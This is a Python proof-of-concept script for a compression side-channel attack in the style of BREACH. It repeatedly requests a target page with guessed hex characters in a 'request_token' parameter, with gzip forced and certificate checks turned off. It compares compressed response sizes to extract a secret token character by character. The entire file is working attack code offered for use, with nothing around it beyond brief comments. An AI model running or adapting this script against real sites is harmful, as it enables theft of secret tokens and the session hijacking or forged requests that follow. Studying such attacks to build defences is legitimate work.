import requests
import time
import urllib3

# Disable insecure request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Replace with the actual URL of the target page
url = 'https://malbot.net/poc'
# The name of the query parameter to manipulate
param_name = 'request_token'

# All hexadecimal characters to try as possible token characters
possible_chars = '0123456789abcdef'

# Initialize the guessed token as an empty string
guessed_token = ''

def get_response_length(guess):
    """
    Sends a request with the given guess and returns the length of the compressed response.

    Args:
        guess (str): The current guessed token.

    Returns:
        int: The length of the compressed response content.
    """
    # Remove quotes around the guess
    # guess_with_quotes = f"'{guess}'"
    guess_with_quotes = guess  # No quotes

    # Set up the params dictionary
    params = {param_name: guess_with_quotes}

    headers = {
        'Accept-Encoding': 'gzip, deflate'  # Ensure the response is compressed
    }
    try:
        # Prepare the request to get the full URL
        req = requests.Request('GET', url, headers=headers, params=params)
        prepared = req.prepare()
        full_url = prepared.url

        # Print the full URL
        print(f"Fetching URL: {full_url}")

        # Send the request using a session
        session = requests.Session()
        response = session.send(prepared, verify=False, stream=True)
        response.raise_for_status()

        # Disable automatic decompression
        response.raw.decode_content = False

        # Read the raw compressed response content
        compressed_content = response.raw.read()
        compressed_length = len(compressed_content)

        # Optionally, print Content-Encoding to verify compression
        content_encoding = response.headers.get('Content-Encoding', '')
        print(f"Content-Encoding: {content_encoding}")

        return compressed_length
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return None

while True:
    found_char = False
    # Get the baseline response length without any new character
    baseline_length = get_response_length(guessed_token)
    if baseline_length is None:
        print("Failed to get baseline response length. Exiting.")
        break
    print(f"Current guessed_token: '{guessed_token}', baseline length: {baseline_length}")

    for c in possible_chars:
        # Append the character to the current guess
        current_guess = guessed_token + c
        # Get the response length for the current guess
        response_length = get_response_length(current_guess)
        if response_length is None:
            continue  # Skip to the next character if the request failed
        print(f"Trying '{current_guess}': response length = {response_length}")

        # If the response length decreases, we've guessed the correct character
        if response_length < baseline_length:
            print(f"Found character: '{c}'")
            guessed_token += c
            found_char = True
            break  # Proceed to guess the next character

        time.sleep(0.1)  # Delay to avoid overwhelming the server

    if not found_char:
        print("Could not find the next character. Exiting.")
        break  # Exit if no character causes a decrease in response length

print(f"Guessed token: '{guessed_token}'")
